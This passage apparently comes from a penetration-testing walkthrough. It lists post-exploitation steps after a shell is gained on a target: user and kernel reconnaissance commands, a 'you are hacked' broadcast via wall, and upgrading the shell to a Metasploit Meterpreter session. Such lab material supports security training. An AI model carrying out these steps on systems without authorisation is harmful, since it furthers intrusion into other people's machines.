### 4. Gain Shell Access
Result: Command shell obtained on target

### 5. Post Exploitation Commands
```bash
whoami              # check current user
id                  # show user ID and groups
uname -a            # kernel information
echo "you are hacked" | wall  # broadcast message
```

### 6. Upgrade to Meterpreter Session
```bash
background          # background current shell
sessions -u 1       # upgrade shell to meterpreter
sessions -l         # list all sessions
sessions -i 2       # interact with meterpreter session
```

### 7. In Meterpreter
```bash
meterpreter > sysinfo
meterpreter > ifconfig
```
